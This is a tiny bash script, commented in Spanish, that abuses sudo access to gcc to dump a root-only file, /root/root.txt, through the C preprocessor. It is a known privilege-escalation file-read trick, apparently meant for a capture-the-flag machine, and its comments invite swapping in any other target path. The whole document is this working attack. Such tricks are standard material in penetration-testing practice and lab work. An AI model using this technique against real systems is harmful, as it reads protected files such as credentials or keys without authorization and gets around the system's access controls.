#!/bin/bash

# Especifica el archivo que deseas leer, por ejemplo, /root/root.txt
LFILE="/root/root.txt"  # Cambia esta ruta si es necesario

# Ejecuta gcc con privilegios de root para leer el archivo
sudo gcc -x c -E "$LFILE"
